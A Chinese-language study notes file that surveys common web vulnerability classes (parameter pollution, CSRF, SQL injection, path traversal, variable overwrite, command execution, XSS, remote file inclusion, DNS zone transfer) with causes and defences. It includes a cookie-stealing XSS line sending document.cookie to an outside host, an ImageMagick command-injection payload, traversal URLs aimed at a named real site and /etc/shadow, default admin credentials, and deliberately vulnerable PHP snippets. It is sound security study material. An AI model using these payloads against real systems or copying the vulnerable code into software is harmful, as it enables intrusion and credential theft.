# 新学期的开始，总是需要整理大量的资料。Vulnerability-list，漏洞列表。
 - 漏洞整理基于seebug的漏洞分类整理（https://www.seebug.org/category/）

## HTTP Parameter Pollution（HTTP参数污染）HPP
描述：https://www.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_(OTG-INPVAL-004)
原理：与客户端进行交互是，客户端在GET/POST中带有参数，参数以名称——值的形式出现，一般而言不会出现重名的参数，但是在HTTP协议中允许相同的参数出现多次。
不同的web服务器对相同2个参数的请求解析不一样。
```sh
PHP / Apache  PHP / Zeus  IBM Lotus Domino 解析后者
JSP, Servlet / Apache Tomcat Perl(CGI)/Apache 解析前者
Python/Apache ASP.NET / IIS  ASP / IIS  解析ALL
```
```sh
案例：
缺陷编号： WooYun-2015-120718 
漏洞标题： 京东某站由HTTP parameter pollution导致的XSS跨站(绕过chrome 的filter) 
相关厂商：  京东商城  
漏洞作者： 大物期末不能挂
parameter：courseName http://xue.jd.com/ondemandCourse/queryOndemandCoursePage.action?classifyId=&courseLable=%25E6%258E%25A8%25E5%25B9%25BF&courseName=123&courseName=12%22%3E%3Cscript%3Ealert(1)%3C/script%3E%3Ca%20herf=%22&flag=1
```
 - 利用方式：1.绕过WAF 2.XSS 3.SQL注入
 
## 后门
后门主要是指绕过安全控制程序而获取对目标的控制权。个人将其分为web后门、硬件后门、移动程序后门。
- web程序后门一般而言均是hacker在取得网站控制权时为了下次访问而上传的后门脚本,或hacker开启的ssh后门。
- 硬件后门常发现的与路由器、防火墙、PLC （可编程控制器）中。
- ios端和android端，主要实现1.录音和截屏2.上传GPS信息3.增删改查app数据4.读写app的钥匙链5.发送数据到服务器6.利用URL schemes打开其他app或者网页7.安装企业应用

## cookie
 - cookie基本了解：cookie是某些网站为了辨别用户身份、进行session跟踪而储存在用户本地终端上的数据；用于保持http会话状态；由服务器或是js脚本写入；保存在用户本地（浏览器），由http头传输；cookie由path（path表示cookie所在的目录，cookie是面向路径的），name，domain（表示cookie面向的域）组成。
 - cookie与SOP（同源策略，同源策略的目的是防止某个文档或是脚本从多个不同的源进行装载，“同源”指的是同协议、同域名、同端口）：某网站地址为www.xxxxxx.com，我们可以设置cookie的域范围为www.xxxxxxcom，同时又设置window.domain=xxxxxx.com，这样就可以让xxx.xxxxxx.com与www.xxxxx.com同源，于是我们可以通过同源策略可以获取到www.leesec.com的cookie。
 - cookie注入：cookie和传统的sql注入原理是一样的都是针对数据库的攻击，只是提交方式和表现方式不同，服务器在获取客户端提交的数据是，没有对以request.cookie(参数)方式提交的数据进行过滤。
 - cookie导致xss：cookie参数过滤不完全，导致某些参数可以被加入恶意代码。
 - cookie重名替换，cookie对于两个相同name的cookie没有规定谁是有效的，这样也可以导致attacker精确的替换正常的cookie来实现精确的攻击。
 - 隐式验证：从第三方web页面发起对当前网站域下的请求，改请求也会带上当前网站的cookie。改缺陷可以导致CSRF攻击。
 - 推荐 作者：走马 的 《cookie之困》 https://github.com/knownsec/KCon/blob/master/2015/Cookie%20%E4%B9%8B%E5%9B%B0.pdf

## 跨站请求伪造
 - CSRF（Cross—Site Request Forgery跨站请求伪造），CSRF被称为“沉睡的巨人”。
 - CSRF原理：CSRF攻击可以劫持终端用户在已登陆的web站点执行非本意（恶意）操作。CSRF产生原因：1.开发者不够谨慎，编写的web程序存在漏洞导致被恶意利用；2.因为web浏览器对cookie和HTTP身份验证等会话信息的处理存在一定的缺陷。
 - 几种常见的CSRF方式：带有src属性的http标签都可以跨域发起GET请求。
 ```sh
<img>标签属性，<script>标签属性，<iframe>标签属性，Image对象（javascript），XMLHTTP（javascript）
```，带有src属性的http标签都可以跨域发起GET请求。
 - CSRF攻击方式 1.HTTP-CSRF,即利用HTML元素发出GET请求（带src属性的HTML标签都可以跨域发起GET请求），若要构造POST请求，则必须用表单提交的方式。2.JSON HiJacking攻击:json以HHTTP方式供外网访问，如果使用浏览器打开，json数据就相当于一个普通的HTTP页面，如果其中包含恶意代码就会产生安全问题。
 - CSRF防御，1.验证Referer；2.使用验证码；3.使用CSRF token；4.限制Session生命周期。
 - example：在例子中的代码情况下，攻击者只需要构造一个特定的url，如：http://www.xxxxxx.com/transfer.php?id=1&money=1000, 只要用户点击了这个连接，恶意代码就会利用用户发送一个u请求执行CSRF，银行卡就会向账号为1的账号转帐1000元。这个案例成功的原因是开发者滥用￥-REQUEST方法，导致本来的POST可以使用GET方式进行实现。
```sh
<foem action= "transfer.php" method="post">
      交易账号<input type="text" name="id"/><br>
      金额    <input type="text" name="money"/><br>
      <input type="submit" value="提交"/>
</form>
```
 - CSRF防御：1.使用token，使攻击者不能预知和伪造请求中的关键字段；2.使用验证码，使用验证码还可以防止恶意注入和b爆破等恶意行为，但是大量使用验证码也会影响用户体验；3.验证HTTP Referer，验证HTTP的请求来源。

## ShellCode
 - shellcode为一段二进制代码，可以根据不同的认为发出一条s系统调用或是建立一个更高权限的shell。shellcode是溢出程序和蠕虫病毒的核心。推荐教程地址：http://www.vividmachines.com/shellcode/shellcode.html
 - 缓冲区shellcode实例
```sh
    int fun(char *shellcode)  
    {  
        char str[4]="";//这里定义4个字节  
        strcpy(str,shellcode);//这两个shellcode如果超过4个字节，就会导致缓冲区溢出  
        printf("%s",str);  
        return 1;  
    }  
    int main(int argc, char* argv[])  
    {  
      char str[]="aaaaaaaaaaaaaaaaaaa!";  
      fun(str);  
      return 0;  
    }  
```
 
## SQL注入 SQL Injection Attacks
 - SQL注入是一种通过操控输入来修改后台sql语句以达到利用代码进行攻击目的的技术。开发人员不能确保从web表单、cookie、输入参数等收到的值传递给sql查询之前对其进行过验证，通常会出现sql注入。（攻击者能过修改sql语句，将该进程与执行命令的组件拥有相同的权限，改权限很高。）产生原因：web应用未对用户提供的数据进行充分s审查和未对输出进行编码。
 - sql盲注：1.基于时间的s技术（根据是否产生延迟来判断是否有注入点，常见函数：sleep(),benchmark()）；2.基于响应sql注入(1.数据库错误响应；2.应用程序x错误响应；HTTP代码响应；)
 - 另类注入：1.宽字节注入；2.伪静态；3.http命令注入。
 - 绕过WAF：1.使用大小写变种；2.使用注释；3.进行编码（url、base64等）；4.空子节替换；5.截断；6.使用waf和web应用解析区别；7.sql语句替换（pass黑名单）。
 - 白盒sql注入（1.检查所有输入，2.根据危险函数反向）：1.危险编码方式（宽字节转编码过程中出现宽字节注入、mysql的类型强制转换、使用了一个未定义的常量等）；2.使用危险的函数；3.跟踪数据变量；4.全局过滤存在白名单；
 - SQL注入按照数据检索的传输通道可以分为：bind inference out-of-bind；bind使用攻击者与web服务器现有的渠道来提取数据，通常是标准的的web服务器的响应，如：union、erroe-based；inference是在服务器执行一系列的操作，然后通关观察推断结果的含义，如：time-injection、bool；out-of-bind，使用其他传输渠道来获取数据，如超文本协议或是DNS协议，当错误信息被禁止显示或是被过滤，可以使用非主流的out-of-bind技术来获取数据，如：使用DNS协议来获取数据，mysql中可以使用函数LOAD_FILE()。

## 任意文件下载
 - 原理：网站使用页面将待下载的文件作为参数来实现下载过程（根据参数值获取路径，读取文件，发给客户端下载），当参数没有进行完全过滤时，就导致网站的任意文件下载/
 - 利用方式：1.配置文件（运维配置文件、软件o配置文件、中间件配置文件、数据库配置文件）；2.漏洞审计；3.信息收集（开放端口、历史文件、日志、用户名、物理路径）
```sh
http://l.airchina.com.cn/cw/skin1/jsp/download.jsp?file=/WEB-INF/web.xml
http://l.airchina.com.cn/cw/skin1/jsp/download.jsp?file=.../WEB-INF/web.xml
```

## 任意文件创建
 - web应用程序对身份认证或是参数、文件过滤不完全，导致web应用程序被任意文件创建、任意文件写入（或导致文件被覆盖）。

## 任意文件删除
 - web应用程序在开发是开发人用的编码不规范导致漏洞的出现。有害的数据（用户可控的数据）进入危险函数，比如：以GET或是POST方式提交数据进入未定义或未过滤函数。
 ```sh
 error_reporting( E_ALL & ~E_NOTICE & ~E_DEPRECATED );

$path = "uploads/".$_GET['folder']."/";	

if($_GET['file_delete']){	//如果原先有图片就删除	

	if(file_exists('.'.$_GET['file_delete'])){	//存在图片

		unlink('.'.$_GET['file_delete']);	//删除它

	}

}
```
 - 文件删除没有设置任何权限限制，导致可以被任意删除。

## 任意文件读取(目录遍历)
 1. 任意文件读取可以读取web目录以外的文件，形如：http://xx.xx.xx.xx/../../../../etc/passwd这样，类似的url可以跨目录读取系统敏感文件，漏洞的原因是因为webserver处理url（不安全的使用open函数）不当引起的。
 2. 形如：http://xx.xx.xx.xx/xx.php>file=../../../../etc/passwd  构造多个../是为了防止程序过滤或是丢失最左侧的符号。多个../不断向上跳转，最后到达根/，然后读取文件。 
 - 常见漏洞参数&RealPath=；&FilePath=；&filepath=；&Path=；&path=；&inputFile=；&url=；&urls=；&Lang=；&dis=；&data=；&readfile=；&filep=；&src=；&menu=；META-INF；WEB-INF
 - 可以利用的路径 /etc/shadow 是passwd的影子文件 /etc/passwd 用户登录信息文件 /etc/hosts主机名以及ip文件 /root/.bash_history 找user add，cd，mysql，ssh，nohop 主机历史操作文件  url=http://10.29.5.24(ssrf内网探测)

## 变量覆盖
 - web应用程序编写函数错误或是传递不安全导致，变量覆盖可以远程写入文件，重置密码读取文件，依据不同的场景可以做不同的漏洞利用。
 - 全局变量覆盖 extract()变量覆盖 遍历初始化变量 parse_str()变量覆盖 PHP5 Globals
```sh
foreach(Array('_GET','_POST','_COOKIE') as $_request)
{
    foreach($$_request as $_k => $_v) ${$_k} = RunMagicQuotes($_v);
}
dedecms的install/index.php中，有这样一段代码:任何传入的变量都会被定义，导致变量覆盖漏洞.
```
```sh
<?php
$a='a'
foreach(@GET as $ key => $var){
	$4key=$var;
}
print $a;
?>
遍历初始化变量 若提交a,可以覆盖初始化d时的值，导致不可控结果。
```
```sh
$var1 = 'init';
parse_str($a[$_GET['var']]);
print $var1;
函数parse_str将字符串解析到参数中  提交var可以覆盖var初始化的init值
```
```sh
<?php  
$auth = '0';  
extract($_GET)；  
if($auth==1){  
echo "private!";  
}else{  
echo "public!";  
}  
?>  
函数extract()将变量从z数组中导入到符号表中，extract()这个函数在指定参数为EXTR_OVERWRITE或者没有指定函数可以导致变量覆盖。
会导致初始化时值的变化
```

## 命令执行
 - 程序员在编写代码时没有对可执行的特殊代码入口进行处理或是过滤不完全，导致客户端可以提交恶意语句，服务器执行。
 - struts2 系列远程命令执行
```
http://xx.xx.xx.xx/system/login_login.action?redirect:http://baidu.com
struts 2-016
```
 - ImageMagick 命令执行
```sh
push graphic-context
viewbox 0 0 640 480
fill 'url(https://"|id; ")'
pop graphic-context
```
 - JAVA反序列化（序列化常用于将程序运行时的对象状态以二进制的形式存储于文件系统中，然后可以在另一个程序中对序列化后的对象状态数据进行反序列化恢复对象。）导致命令执行漏洞 Jboss WebLogic等服务器。
 - Python或者PHP这两个语言中的反序列化过程都能直接导致代码执行或者命令执行。
 - 浏览器和路由器命令执行漏洞。

## XSS（推荐：XSS跨站脚本攻击剖析与防御）
 - XSS(Cross-Site Scripting)，1996年诞生，一直被OWASPz组织评为十大安全漏洞中的第二大威胁漏洞，是由于web应用许恒徐对用户的输入过滤不足引起而产生的。攻击者利用网站的安全漏洞把恶意的脚本代码注入到页面中，但正常用户访问时，就会执行其中的安全漏洞，对受害者可能造成Cookie资料盗取、会话劫持、钓鱼欺骗等。
 - XSS漏洞流行的原因：1.Web浏览器的本身设计就是不安全的；2.输出与输入是Web应用程序最基本的用户交互，如果没有做好安全处理，很容易会造成Xss；3.很多开发者都没有真正意识到XSS漏洞的严重性；4.Xss触发s方式简单，只需要向HTML代码中注入脚本；5.Web2.0的发展，网站的交互越来越丰富；
 - Xss的分类：
 1.反射型，只执行一次，非持久化，通常出现在网站的搜索栏、用户登陆的地方，常用来获取用户的cookies或进行钓鱼欺骗；
 2.持久型（存储型）Xss，比反射型更有威胁，并且可以影响到Web服务器自身的安全，攻击者事先将恶意代码上传或存储到漏洞服务器中，只要受害者浏览这个带有l恶意代码的页面就会执行恶意代码。一般出现在网站的留言板、评论、博客日志等交互处。 
```sh
反射型
 <script>alert("xss")</script>
 %3Cscript%3Ealert%281%29%3C/script%3E
 javascript:alert(documnet.cookie)
 ```
 - Xss恶意代码的构造（绕过xss-filter）:
 1.利用HTML标签属性值执行XSS；2.对于基于黑白名单的fiter，可以使用tab、空格、回车来绕过限制。3.对标签属性值进行转码。4.利用css进行跨站
```sh
<table background="javascript;alert（xss）"></table>
<img src="javascript="alert(1);">
很多HTML标签都支持javascript:[code]伪协议的形式，协议声明了URL的主体是任意的JavaScript代码，由Javascript的解释器运行。
href= lowsrc= bgsound= background= value= action=
```
 - Xss利用方式：1.窃取Cookie；2.网络钓鱼；3.信息收集(刺探内网，收集ip地址kport等信息)；4.蠕虫；
```sh
document.location="http://xxx.xxx.xxx.xxx/cookie.asp?cookie="+document.cookie
```
 - Flash安全导致的Xss问题，flash是一种交互式矢量多媒体技术，Flash支持全局变量y，由次导致一定的安全隐患。Flash有内置的脚本语言ActionScript（是基于javascript的）。利用嵌入Web页面中的Flash进行XSS由allowScriptAccess属性决定，该属性决定Flash是否可以执行脚本代码。
```sh
缺陷编号： WooYun-2014-51615 
漏洞标题： 一个可大规模悄无声息窃取淘宝/支付宝账号与密码的漏洞 -（埋雷式攻击附带视频演示）  
相关厂商：  淘宝网  
漏洞作者： gainover
漏洞类型： XSS 跨站脚本攻击
正则表达式过滤不完全导致 FLASH XSS Rookit
```
 - 防御XSS：1.使用XSS-filter；2.过滤用户可控的输入，一切输入都是有害的；3.在输出数据前对潜在威胁的字符进行编码、转义；4.对于web应用使用WAF；

## 弱密码（weak password）
 - 弱密码：容易被人猜解或是被工具破解的都属于弱密码；
 - 常见设备默认密码：1.tomcat http://xxx.xxx.xxx.xxx/manager/html admin/admin,部署war包，可getshell;2.weblogic http://xxx.xxx.xxx.xxx/console/login/LoginForm.jspweblogic/weblogic，探测内网，上传shell；3.Websphere6.x-7x有个问题，只需输入“此用户标识”即可登录Websphere后台获取WebShell；5.一些常见的路由器或是防火墙、视频监控存在 admin/admin或是123456等弱密码。

## 拒绝服务(denial of server)
 - 攻击者使用一定的方法使目标z服务器无法提供服务。1.目标服务器缓冲区满，不能接受新的请求；2.使用欺骗ip，影响合法用户的连接。DOS（拒绝服务)，DDOS（分布式拒绝服务攻击）。
 - DDOS：1.网络层攻击：syn-flood（TCP建立连接时三次“握手”的漏洞，使用虚假的SYN报文，占用服务器的协议堆栈，是互联网最主要的DDOS形式）、ACK-Flood、UDP-Flood（发送大量虚假的UDP包，以DNS为主）、ICMP-Flood（ping）；2.应用层攻击：CC（向目标d发起大量的真实HTTP请求，消耗大量的并发资源，CC是应用层主要的攻击方式）、DNS-flood（伪造大量的DNS请求）、慢速连接攻击、。
 - 攻击方式：1.混合型：TCP、UDP流量，应用层和网络层的混合攻击；2.将SYN的源地址写为目标地址，向真实TCP服务器发送TCP的SYN包，而这些收到SYN包的TCP server为了完成3次握手把SYN|ACK包“应答”给目标地址。3.流量放大型；4.脉冲型；5.链路泛洪：link-flooding attack，以堵塞目标的上一级链路为目的；
 - 防御：本质是一种只能缓解不能完全解决的攻击，1.ISP近源清洗；2.云清洗/CDN硬抗；3.DC级近目清洗；4.OS/APP抗cc。

## 数据库
 - 数据库弱密码、未授权访问；
 - mongodb启动时未加 --auth选项，导致无需认证即可连接mongodb数据库。
 - JBRCMS多数网站没有改默认数据库位置，导致数据库可被下载

## 文件上传
 - 网站的上传实现代码没有严格限制用户上传的文件后缀和文件类型，导致允许攻击者通过访问的web目录任意上传文件，并能够将文件传递给解析器，实现了文件任意上传漏洞。文件上传漏洞一直是攻击者获取webshell的重要途径；
 - 1.文件s上传时检查不严格；2.文件上传后修改文件名处理不当；3.应用第三方不安全插件；

## 远程文件包含(Remote File Inclusion)
 - RFI是指服务器利用系统包含函数来包含远程文件，但是由于过滤不严导致可以包含服务器外的远程文件导致安全漏洞。
 - 涉及到的危险函数：1.include()、require()，两个函数的区别是当发生错误时的处理方式，icnlude()函数产生一个警告，而requrie则是产生一个致命错误;2.include_once()、requrie_once(),当文件代码被包含后，就不会在进行一次包含处理，在脚本执行期间进行包含并t运行文件。
 ```sh
 漏洞代码实例：
     <?php  
    // 存在RFI漏洞的代码片段  
    $file = $_GET['file'];  
    include $file;  
    ?>  
```
 - 漏洞利用：1.读出本地服务器的敏感文件；2.包含可运行的php木马；3.创建Webshell；
 
## DNS配置不当
 - DNF域传送漏洞，DNS服务器配置不当可以导致任意匿名用户可以获取DNS某一域的所有DNS记录，使企业的基础网络和网络构架对外开放，甚至严重的会导致内网被渗透，可以使用nslookup、dig命令检测；DNS域传送防御：可以在服务器的zone、optionsz中对allow-transfer进行设置可以进行服务器同步的设置，可以进行ip、key限制。
```sh
//检测服务器bind是否受拒绝服务影响
dig @dns.xxx.xxx.com txt version.bind chaos
//是否存在主备服务器 DNS一般x情况下使用UDP协议通信，但是在区域传送是使用TCP协议
nmap -sS -sU -p 53 xxx.xxx.xxx.com
```
 - DNS放大攻击。

## 本地溢出
 - 溢出漏洞是计算机的一种可更正性缺陷。
 - 程序中的某些或是某个输入函数/参数对所接受数据的边界验证不严密造成的。
 - for example：FreeBSD本地内存泄露漏洞，一个漏洞是由于内核向用户态缓冲区复制数据时没有正确地清除原有内容，另一个漏洞是由于向用户缓冲区复制了过多的数据。

## 权限提升
 - 将低权限、s受限制的用户提升至系统的较高权限用户。
 
## 信息泄露  Information Disclosure
  - 泄露的系统信息或者调试信息可以帮助攻击者了解系统和制定攻击计划。信息泄露一般发生在程序使用输出或者日志功能的时候。
  
## 登陆绕过（权限绕过）
 - web应用程序开发人员在编写程序代码时，没有正确进行身份验证控制或是过滤不完全，但是非权限攻击者可以绕过验证获取权限。
